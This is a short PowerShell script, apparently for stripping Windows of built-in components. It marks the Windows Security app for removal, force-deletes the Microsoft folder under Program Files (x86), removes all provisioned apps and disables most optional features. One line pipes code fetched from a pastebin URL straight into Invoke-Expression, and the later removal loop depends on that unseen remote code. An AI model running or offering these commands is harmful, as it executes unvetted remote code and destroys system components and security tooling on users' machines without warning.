$Appx = (Get-AppxPackage *SecHealthUI).PackageFullName
$Sid = (Get-LocalUser $Env:UserName).Sid.Value

New-Item HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\EndOfLife\$Sid\$Appx -Force | Out-Null

Stop-Process -Name SearchHost,*Edge* -Force -ErrorAction SilentlyContinue
Remove-Item "C:\Program Files (x86)\Microsoft" -Recurse -Force

OneDriveSetup /uninstall

foreach ($Package in (Get-ProvisionedAppPackage -Online).PackageName) {
    Dism /Online /Remove-ProvisionedAppPackage /PackageName:$Package /Quiet /NoRestart | Out-Null
}

foreach ($feature in (Get-WindowsOptionalFeature -Online | Where-Object State -eq Enabled | Where-Object FeatureName -notmatch 'Defender').FeatureName) {
    Dism /Online /Disable-Feature /FeatureName:$feature /NoRestart | Out-Null
}

irm pastebin.com/raw/BiVeKbYf | iex
foreach ($Package in $Packages) {
    Get-AppxPackage $Package | Remove-AppxPackage
}

Dism /Online /Enable-Feature /FeatureName:Microsoft-Hyper-V-All /All /NoRestart | Out-Null
